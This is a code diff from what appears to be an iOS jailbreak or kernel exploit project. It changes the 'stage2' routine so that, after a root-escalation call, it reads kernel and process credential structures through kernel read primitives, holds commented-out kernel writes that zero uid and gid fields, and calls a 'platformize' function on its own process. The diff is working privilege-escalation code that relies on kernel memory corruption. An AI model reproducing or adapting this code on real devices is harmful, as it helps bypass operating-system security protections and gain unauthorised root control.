@@ -11,6 +11,7 @@
 #include "IOKit_electra.h"
 #include "proc.h"
 #include "stage2.h"
+#include "escalate.h"
 
 mach_port_t user_client;
 uint64_t fake_client;
@@ -127,22 +128,39 @@ void mineek_getRoot(uint64_t proc_addr)
     printf("[i] getuid: %d\n", getuid());
 }
 
-uint64_t find_ucred(uint64_t proc_addr){
+void ucred_test(uint64_t proc_addr) {
     uint64_t self_ro = kread64(proc_addr + 0x20);
-    printf("[i] self_ro: 0x%llx\n", self_ro);
     uint64_t self_ucred = kread64(self_ro + 0x20);
-    printf("[i] ucred: 0x%llx\n", self_ucred);
-    printf("[i] test_uid = %d\n", getuid());
-
     uint64_t kernproc = get_kernproc();
-    printf("[i] kern proc: %llx\n", kernproc);
     uint64_t kern_ro = kread64(kernproc + 0x20);
-    printf("[i] kern_ro: 0x%llx\n", kern_ro);
     uint64_t kern_ucred = kread64(kern_ro + 0x20);
-    printf("[i] kern_ucred: 0x%llx\n", kern_ucred);
-    return kern_ucred;
+    uint64_t proc_set_ucred = off_proc_set_ucred;
+    proc_set_ucred += get_kslide();
+    
+    uint64_t ucred = self_ucred;
+    
+    printf("[i] proc + off_p_uid:  0x%x\n", kread32(kernproc + off_p_uid));
+    printf("[i] proc + off_p_ruid: 0x%x\n", kread32(kernproc + off_p_ruid));
+    printf("[i] proc + off_p_gid:  0x%x\n", kread32(kernproc + off_p_gid));
+    printf("[i] proc + off_p_rgid: 0x%x\n", kread32(kernproc + off_p_rgid));
+    printf("[i] ucred + off_u_cr_uid:     0x%x\n", kread32(ucred + off_u_cr_uid));
+    printf("[i] ucred + off_u_cr_ruid:    0x%x\n", kread32(ucred + off_u_cr_ruid));
+    printf("[i] ucred + off_u_cr_svuid:   0x%x\n", kread32(ucred + off_u_cr_svuid));
+    printf("[i] ucred + off_u_cr_ngroups: 0x%x\n", kread32(ucred + off_u_cr_ngroups));
+    printf("[i] ucred + off_u_cr_groups:  0x%x\n", kread32(ucred + off_u_cr_groups));
+    printf("[i] ucred + off_u_cr_rgid:    0x%x\n", kread32(ucred + off_u_cr_rgid));
+    printf("[i] ucred + off_u_cr_svgid:   0x%x\n", kread32(ucred + off_u_cr_svgid));
+    //uint64_t cr_posix_ptr = 0;
+    //cr_posix_ptr = ucred + 0x18;
+    //printf("[i] svuid: 0x%x\n", kread32(cr_posix_ptr + 0x8));
+    //kwrite32(cr_posix_ptr + 0x8, 0x0);
+    //cr_posix_ptr = ucred + 0x18;
+    //printf("[i] cr_groups: 0x%x\n", kread32(cr_posix_ptr + 0x8));
+    //kwrite32(cr_posix_ptr + 0x10, 0x0);
+    //cr_posix_ptr = ucred + 0x18;
+    //printf("[i] svgid: 0x%x\n", kread32(cr_posix_ptr + 0x8));
+    //kwrite32(cr_posix_ptr + 0x54, 0x0);
 }
-
 
 void stage2(void) {
     pid_t pid = getpid();
@@ -153,4 +171,7 @@ void stage2(void) {
     mineek_init_kcall();
     printf("[i] getRoot!\n");
     mineek_getRoot(proc_addr);
+    usleep(10000);
+    ucred_test(proc_addr);
+    platformize(getpid());
 }
